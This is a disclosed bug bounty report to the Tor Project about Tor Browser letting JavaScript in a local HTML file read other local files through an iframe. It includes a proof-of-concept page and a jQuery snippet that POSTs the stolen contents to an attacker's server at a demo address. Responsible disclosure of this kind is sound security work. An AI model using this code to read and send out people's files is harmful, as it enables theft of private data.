# Access to local file system using javascript

## Report Details
- **Report ID**: 258630
- **URL**: https://hackerone.com/reports/258630
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-08-10T14:59:01.413Z
- **Disclosed**: 2017-11-18T09:28:06.412Z

## Reporter
- **Username**: cuso4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: torproject

## Vulnerability Information
Issue :

Access to local file system using javascript(slightly xss on server side )

The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.


Steps to Reproduce :


save a html file from here and open in tor browser .

<html>
<body>
<div id='div1'>
</div>
<script>
current_href = document.location.href
frame = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
alert('Your data is: ' + loot)
}, 500)
</script>
</body>
</html>



Explaination :  file:///home/jnsjns/Desktop/poc5.html  this is my test html here.

                file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser 

the private file is coming by popup (I have tested in chrome -Google ,they are safe from this )


What attacker can do ?


I would have been able to post it to my server using jquery like this.

//Gets data from iframe and saves it to the getdata variable
getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
//Posts to the php server located at 192.168.0.102 (local address for demo purposes)
$.ajax({type: "POST", url: "http://192.168.0.102/post.php", data: {string:getdata}});}


This issue may critical .


Regards.






## Attachments
No attachments
